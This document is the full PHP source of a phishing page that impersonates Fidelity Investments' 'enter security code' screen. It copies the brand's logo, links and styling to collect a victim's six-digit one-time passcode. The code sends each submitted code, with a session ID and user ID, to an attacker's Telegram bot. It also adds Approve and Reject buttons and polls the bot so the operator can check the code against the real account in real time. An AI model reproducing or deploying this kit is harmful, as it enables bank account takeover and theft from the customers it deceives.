<?php
session_start();
header('Content-Type: text/html; charset=UTF-8');

include __DIR__ . '/../config.php';

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function getOrCreateSessionId() {
    if (!isset($_SESSION['current_user_id']) || empty($_SESSION['current_user_id'])) {
        $_SESSION['current_user_id'] = '#' . strtoupper(substr(md5(uniqid('', true)), 0, 6));
    }
    return $_SESSION['current_user_id'];
}

function setOtpStatus($sessionId, $status) {
    $_SESSION['otp_status_' . $sessionId] = [
        'status' => $status,
        'updatedAt' => date('c')
    ];
    return true;
}

function getOtpStatus($sessionId) {
    $key = 'otp_status_' . $sessionId;
    if (isset($_SESSION[$key]) && isset($_SESSION[$key]['status'])) {
        return $_SESSION[$key]['status'];
    }
    return 'pending';
}

function setLoginStatus($sessionId, $status) {
    $_SESSION['login_status_' . $sessionId] = [
        'status' => $status,
        'updatedAt' => date('c')
    ];
    return true;
}

function processTelegramUpdate($update) {
    include __DIR__ . '/../config.php';
    
    if ($update && isset($update['callback_query'])) {
        $cb = $update['callback_query'];
        $messageChatId = $cb['message']['chat']['id'] ?? null;
        $data = $cb['data'] ?? '';
        
        if (strpos($data, 'OTP|') === 0) {
            $parts = explode('|', $data);
            $sessionId = $parts[1] ?? '';
            $action = strtolower($parts[2] ?? '');
            $status = ($action === 'approve') ? 'approved' : 'rejected';
            
            setOtpStatus($sessionId, $status);
            
            $apiBase = 'https://api.telegram.org/bot' . $botToken . '/';
            
            $answerData = array(
                'callback_query_id' => $cb['id'], 
                'text' => strtoupper($status) . ' for ' . $sessionId, 
                'show_alert' => false
            );
            
            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $apiBase . 'answerCallbackQuery');
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($answerData));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_exec($ch);
                curl_close($ch);
            }
            
            if (!empty($cb['message']['message_id'])) {
                $editPayload = array(
                    'chat_id' => $messageChatId,
                    'message_id' => $cb['message']['message_id'],
                    'reply_markup' => json_encode(array('inline_keyboard' => array())),
                    'text' => (($cb['message']['text'] ?? '') . "\n\n➡️ Decision: " . strtoupper($status))
                );
                
                if (function_exists('curl_init')) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $apiBase . 'editMessageText');
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($editPayload));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_exec($ch);
                    curl_close($ch);
                }
            }
            return true;
        } elseif (strpos($data, 'LOGIN|') === 0) {
            $parts = explode('|', $data);
            $sessionId = $parts[1] ?? '';
            $action = strtolower($parts[2] ?? '');
            $status = ($action === 'approve') ? 'approved' : 'rejected';
            
            setLoginStatus($sessionId, $status);
            
            $apiBase = 'https://api.telegram.org/bot' . $botToken . '/';
            
            $answerData = array(
                'callback_query_id' => $cb['id'], 
                'text' => strtoupper($status) . ' for ' . $sessionId, 
                'show_alert' => false
            );
            
            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $apiBase . 'answerCallbackQuery');
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($answerData));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_exec($ch);
                curl_close($ch);
            }
            
            if (!empty($cb['message']['message_id'])) {
                $editPayload = array(
                    'chat_id' => $messageChatId,
                    'message_id' => $cb['message']['message_id'],
                    'reply_markup' => json_encode(array('inline_keyboard' => array())),
                    'text' => (($cb['message']['text'] ?? '') . "\n\n➡️ Decision: " . strtoupper($status))
                );
                
                if (function_exists('curl_init')) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $apiBase . 'editMessageText');
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($editPayload));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_exec($ch);
                    curl_close($ch);
                }
            }
            return true;
        }
    }
    return false;
}

if (isset($_GET['action']) && $_GET['action'] === 'status') {
    header('Content-Type: application/json');
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    
    $sessionId = getOrCreateSessionId();
    $status = getOtpStatus($sessionId);
    
    if (isset($botToken) && !empty($botToken)) {
        $apiUrl = 'https://api.telegram.org/bot' . $botToken . '/getUpdates';
        $offset = $_SESSION['telegram_offset_otp'] ?? 0;
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $apiUrl . '?offset=' . $offset . '&timeout=1');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 2);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $response = @curl_exec($ch);
            curl_close($ch);
        } else {
            $response = @file_get_contents($apiUrl . '?offset=' . $offset . '&timeout=1');
        }
        
        if ($response) {
            $updates = @json_decode($response, true);
            if (isset($updates['ok']) && $updates['ok'] === true && !empty($updates['result'])) {
                foreach ($updates['result'] as $update) {
                    @processTelegramUpdate($update);
                }
                $lastUpdate = end($updates['result']);
                $_SESSION['telegram_offset_otp'] = $lastUpdate['update_id'] + 1;
            }
        }
        
        $status = getOtpStatus($sessionId);
    }
    
    echo json_encode(array('status' => $status, 'sessionId' => $sessionId));
    exit();
}

function sendOtpToTelegram($otp, $userInfo) {
    include __DIR__ . '/../config.php';

    $sessionId = getOrCreateSessionId();
    $userId = $_SESSION['fidelity_user_id'] ?? '';
    
    $message = "🔐 𝐎𝐍𝐄-𝐓𝐈𝐌𝐄 𝐏𝐀𝐒𝐒𝐂𝐎𝐃𝐄 (𝐎𝐓𝐏) 🔐\n";
    $message .= "═══════════════════════\n\n";
    $message .= "👤 𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐈𝐍𝐅𝐎:\n";
    $message .= "🆔 Session ID: " . $sessionId . "\n";
    if ($userId) { $message .= "📋 User ID: " . $userId . "\n"; }
    $message .= "🔢 OTP Code: " . $otp . "\n";
    $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "═══════════════════════";
    
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $approveCallback = 'OTP|' . $sessionId . '|approve';
    $rejectCallback = 'OTP|' . $sessionId . '|reject';
    
    $replyMarkup = array(
        'inline_keyboard' => array(
            array(
                array('text' => '✅ Approve', 'callback_data' => $approveCallback),
                array('text' => '❌ Reject', 'callback_data' => $rejectCallback)
            )
        )
    );
    
    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode($replyMarkup)
    );

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $response = curl_exec($ch);
        curl_close($ch);

        $decoded = json_decode($response, true);
        if (isset($decoded['ok']) && $decoded['ok'] === true) {
            return true;
        }
        return false;
    } else {
        $options = array(
            'http' => array(
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'timeout' => 15,
                'ignore_errors' => true
            ),
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            )
        );
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result === false) {
            return false;
        }
        $decoded = json_decode($result, true);
        if (!isset($decoded['ok']) || $decoded['ok'] !== true) {
            return false;
        }
        return true;
    }
}

$startPending = false;
$otpError = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = $_POST['otp'] ?? '';
    $otp = trim($otp);
    
    if (empty($otp)) {
        $otpError = 'Please enter the security code.';
    } elseif (!preg_match('/^\d{6}$/', $otp)) {
        $otpError = 'Please enter a valid 6-digit code.';
    } else {
        $sessionId = getOrCreateSessionId();
        
        setOtpStatus($sessionId, 'pending');
        
        $userInfo = array();
        sendOtpToTelegram($otp, $userInfo);
        
        $_SESSION['otp_submitted'] = true;
        $startPending = true;
    }
}

if (isset($_SESSION['otp_submitted']) && $_SESSION['otp_submitted'] && !$startPending) {
    $sessionId = getOrCreateSessionId();
    $status = getOtpStatus($sessionId);
    if ($status === 'approved') {
        echo '<!DOCTYPE html><html><head><title>Success</title></head><body style="text-align:center; padding:50px;"><h1 style="color:#368727;">Verification Successful</h1><p>Thank you for verifying your identity.</p></body></html>';
        exit();
    } elseif ($status === 'rejected') {
        unset($_SESSION['otp_submitted']);
        $otpError = 'The code you entered could not be verified. Please check the code and try again.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enter security code - Fidelity</title>
<link rel="stylesheet" href="/assets/fonts.css">
<style>
* {
    box-sizing: border-box;
}
body {
    font-family: 'Fidelity Sans', Arial, sans-serif;
    margin: 0;
    padding: 0;
    background: #fff;
    color: #000;
}
.pvdsms-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 1rem 2rem;
    border-bottom: 1px solid #ccc;
}
.pvdsms-header-logo img {
    height: 28px;
}
.pvdsms-header-links {
    display: flex;
    gap: 1.5rem;
}
.pvdsms-header-links a {
    color: #006fba;
    text-decoration: none;
    font-size: 14px;
}
.pvdsms-header-links a:hover {
    text-decoration: underline;
}
.container {
    max-width: 600px;
    margin: 2rem auto;
    padding: 0 1rem;
}
.login-box {
    border: 1px solid #ccc;
    border-radius: 8px;
    padding: 2rem;
}
.loading {
    display: none;
    text-align: center;
    padding: 2rem;
}
.loading.show {
    display: block;
}
.spinner {
    display: inline-block;
    width: 40px;
    height: 40px;
    border: 3px solid #f3f3f3;
    border-top: 3px solid #3498db;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 1rem;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
.login-title {
    font-size: 1.5rem;
    font-weight: 300;
    margin: 0 0 0.5rem 0;
}
.sub-text {
    color: #666;
    font-size: 0.9rem;
    margin-bottom: 1.5rem;
    display: block;
}
.form-group {
    margin-bottom: 1.5rem;
}
label {
    display: block;
    font-weight: 600;
    margin-bottom: 0.5rem;
}
input[type="text"] {
    width: 100%;
    padding: 0.75rem;
    border: 1px solid #888;
    border-radius: 4px;
    font-size: 1rem;
    font-family: inherit;
}
input[type="text"]:focus {
    outline: none;
    border-color: #000;
    box-shadow: 0 0 0 2px #666;
}
input[type="text"].error {
    border-color: #DC1616;
}
button {
    background: #368727;
    color: #fff;
    border: none;
    padding: 0.75rem 1.5rem;
    border-radius: 4px;
    font-size: 1rem;
    cursor: pointer;
    width: 100%;
    font-family: inherit;
}
button:hover {
    background: #2B6B1E;
}
.otp-error {
    display: none;
    align-items: center;
    gap: 10px;
    margin-bottom: 1rem;
    padding: 1rem;
    border-radius: 8px;
    border: 2px solid #DC1616;
    background: #FFF5F5;
    color: #DC1616;
}
.otp-error.show {
    display: flex;
}
.otp-shake {
    animation: otpShake 0.35s ease;
}
@keyframes otpShake {
    10% { transform: translateX(-2px); }
    30% { transform: translateX(3px); }
    50% { transform: translateX(-3px); }
    70% { transform: translateX(2px); }
    90% { transform: translateX(-1px); }
    100% { transform: translateX(0); }
}
.hide {
    display: none !important;
}
@media (max-width: 768px) {
    .pvdsms-header {
        padding: 1rem;
    }
    .container {
        margin: 0;
    }
    .login-box {
        border: none;
        border-bottom: 1px solid #ccc;
        border-radius: 0;
    }
}
</style>
</head>
<body>

<header class="pvdsms-header">
<div class="pvdsms-header-logo">
<a href="https://www.fidelity.com/">
<img src="/assets/Fidelity-wordmark.svg" alt="Fidelity Investments">
</a>
</div>
<div class="pvdsms-header-links">
<a href="https://www.fidelity.com/security/overview">Security</a>
<a href="https://www.fidelity.com/customer-service/need-help-logging-in">FAQs</a>
</div>
</header>

<div class="container">
<div class="login-box">

<div class="loading<?php if (!empty($startPending)): ?> show<?php endif; ?>" id="loading">
    <div class="spinner"></div>
    <div>Please give us a moment while we verify the information.</div>
    <ul style="text-align:left; max-width:400px; margin:1rem auto; color:#666;">
        <li>Please do not refresh or close this page.</li>
        <li>This process may take up to, but will not exceed, 5 minutes of waiting.</li>
    </ul>
</div>

<div class="content<?php if (!empty($startPending)): ?> hide<?php endif; ?>" id="content">

<h1 class="login-title">Enter the code we just sent to your phone</h1>
<span class="sub-text">We sent the code to (XXX) XXX-<?php echo isset($_SESSION['fidelity_phone']) ? substr($_SESSION['fidelity_phone'], -4) : 'XXXX'; ?>. It will expire after 30 minutes.</span>

<div class="otp-error<?php if (!empty($otpError)): ?> show<?php endif; ?>" id="otpError">
<svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="currentColor"/>
</svg>
<span><?php echo htmlspecialchars($otpError); ?></span>
</div>

<form method="POST" action="" id="otpForm">
<div class="form-group">
<label for="code">Security code</label>
<input type="text" id="code" name="otp" placeholder="XXXXXX" maxlength="6" autocomplete="off" pattern="\d{6}" required>
</div>
<button type="submit">Submit</button>
</form>

</div>
</div>
</div>

<script>
var otpInput = document.getElementById('code');
var otpForm = document.getElementById('otpForm');
var otpError = document.getElementById('otpError');
var loadingDiv = document.getElementById('loading');
var contentDiv = document.getElementById('content');

otpInput.addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
    if (e.target.value.length > 6) {
        e.target.value = e.target.value.slice(0, 6);
    }
    otpError.classList.remove('show');
    otpInput.classList.remove('error');
});

function isLoading(bool) {
    if (bool) {
        loadingDiv.classList.add('show');
        contentDiv.classList.add('hide');
    } else {
        loadingDiv.classList.remove('show');
        contentDiv.classList.remove('hide');
    }
}

otpForm.addEventListener('submit', function(e) {
    var code = otpInput.value.trim();
    if (!/^\d{6}$/.test(code)) {
        e.preventDefault();
        otpInput.classList.add('error');
        otpError.classList.add('show');
        otpError.querySelector('span').textContent = 'Please enter a valid 6-digit code.';
        return false;
    }
    isLoading(true);
});

otpInput.focus();

<?php if (!empty($startPending)): ?>
(function(){
    isLoading(true);
    var polling = true;
    
    function poll() {
        if (!polling) return;
        fetch('?action=status', {cache: 'no-store'})
            .then(function(res) { return res.json(); })
            .then(function(data) {
                if (data && data.status === 'approved') {
                    polling = false;
                    document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h1 style="color:#368727;">Verification Successful</h1><p>Thank you for verifying your identity. You may now close this window.</p></div>';
                } else if (data && data.status === 'rejected') {
                    polling = false;
                    isLoading(false);
                    otpInput.value = '';
                    otpInput.focus();
                    otpInput.classList.add('otp-shake');
                    otpInput.classList.add('error');
                    otpError.classList.add('show');
                    otpError.querySelector('span').textContent = 'The code you entered could not be verified. Please check the code and try again.';
                    setTimeout(function() { otpInput.classList.remove('otp-shake'); }, 400);
                }
            })
            .catch(function() {})
            .finally(function() { 
                if (polling) setTimeout(poll, 2000); 
            });
    }
    poll();
})();
<?php endif; ?>
</script>

</body>
</html>
